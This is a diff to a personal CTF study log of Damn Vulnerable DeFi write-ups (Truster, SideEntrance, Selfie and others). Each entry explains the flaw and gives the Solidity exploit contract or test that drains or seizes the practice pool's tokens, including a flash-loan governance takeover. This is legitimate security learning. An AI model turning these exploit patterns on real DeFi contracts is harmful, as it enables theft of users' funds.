@@ -34,7 +34,7 @@ If `convertToShares(totalSupply) != totalAssets()` revert then the problem will 
 Simply, deposit some token directly, so the condition will be broken since supply only update while mint/burn.
 
 Solve:
-```solidity=
+```solidity
     function test_unstoppable() public checkSolvedByPlayer {
         token.transfer(address(vault), 10);
     }
@@ -46,7 +46,7 @@ Solve:
 Issue:
 
 The issue algin with the challenge is that, the share update in `transferFrom` function always using legacy share amount when `from` and `to` address are same.
-```solidity=
+```solidity
     function transferFrom(
         address from,
         address to,
@@ -70,7 +70,7 @@ The issue algin with the challenge is that, the share update in `transferFrom` f
 ```
 
 Solve:
-```solidity=
+```solidity
     function solve() external {
         // Claim 1000 GREY
         setup.claim();
@@ -93,6 +93,157 @@ Solve:
         setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this)));
 
     }
+```
+
+### 2024.08.30
+
+- Damn Vulnerable DeFi: Truster
+- Damn Vulnerable DeFi: SideEntrance
+
+#### Truster
+Issue:
+
+The issue for this flashloan contract is the usage of `functionCall` which allows the attacker perform function call under flashloan contract's context.
+
+Solve:
+```solidity
+    function test_truster() public checkSolvedByPlayer {
+        test t = new test();
+
+        bytes memory approveData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            player,
+            type(uint256).max
+        );
+        
+        pool.flashLoan(0, player, address(pool.token()), approveData);
+
+        pool.token().transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+
+    }
+```
+
+#### SideEntrance
+Issue: 
+
+The main idea for this program is utilize the the deposit function while flashloan which will manipulate the balance and also fulfill the balance requirement to complete the flashloan.
+
+Solve:
+
+```solidity
+function test_sideEntrance() public checkSolvedByPlayer {
+    Exploit exp = new Exploit(address(pool), recovery);
+    exp.attack(address(pool).balance);
+}
+
+contract Exploit{
+    SideEntranceLenderPool pool;
+
+    address recovery;
+    constructor(address _pool, address _recovery) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+    }
+    function execute()public payable{
+        pool.deposit{value:address(this).balance}();
+    }
+    function attack(uint256 amount) public payable{
+        pool.flashLoan(amount);
+        pool.withdraw();
+        payable(recovery).transfer(address(this).balance);
+    }
+    receive () external payable {}
+
+}
+```
+
+### 2024.08.31
+
+- Damn Vulnerable DeFi: Selfie
+
+#### Selfie
+Issue:
+
+I feel the biggest issue is that the pool is providing the governance token via flash loan; as long as the token exceeds half of the supply, the proposal can be passed.
+
+```solidity
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        uint256 balance = _votingToken.getVotes(who);
+        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
+        return balance > halfTotalSupply;
+    }
+```
+
+Solve:
+```solidity
+    function test_selfie() public checkSolvedByPlayer {
+        SelfiePoolExploit spe = new SelfiePoolExploit(
+            pool,
+            governance,
+            token,
+            recovery
+        );
+
+        spe.attack();
+
+        vm.warp(block.timestamp + 2 days);
+        spe.executeAction();
+
+    }
+
+```
+
+```solidity
+contract SelfiePoolExploit {
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes votes;
+    uint256 public actionId;
+    address owner;
+    address recovery;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _vote, address _recovery) {
+        pool = _pool;
+        governance = _governance;
+        votes = _vote;
+        owner = msg.sender;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // init flashloan
+        uint256 amount = pool.token().balanceOf(address(pool));
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(pool.token()), amount, data);
+    }
+
+    function onFlashLoan(
+        address _initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+
+        votes.delegate(address(this));
+
+        uint _actionId = governance.queueAction(
+            address(pool),
+            0,
+            data
+        );
+        actionId = _actionId;
+
+        IERC20(token).approve(address(pool), amount + fee);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction() external {
+        // Execute the malicious auction
+        governance.executeAction(actionId);
+    }
+}
 ```
 
 <!-- Content_END -->
